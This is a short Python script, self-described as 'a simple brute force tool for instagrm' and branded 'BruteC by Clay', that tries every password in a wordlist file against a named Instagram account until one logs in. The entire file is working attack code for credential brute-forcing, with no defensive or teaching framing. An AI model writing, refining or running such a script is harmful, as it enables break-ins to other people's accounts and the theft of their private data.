import time
import inpass
import pyfiglet

text = "BruteC by Clay"
banner = pyfiglet.figlet_format(text)
print(banner)
print("This tool is created by clay group on instagram h4cker.in ")
print("This is a simple brute force tool for instagrm ")
username = "username"
password_file = "pass.txt"
                                                                       
with open(password_file, 'r') as file:
    passwords = file.read().splitlines()

for password in passwords:
    if inpass.login(username, password):
        print(f"Password is :  {password}")
        break
    else:
        print(f"Password {password} failed")
    time.sleep(1)
else:
    print("No password found in file.")
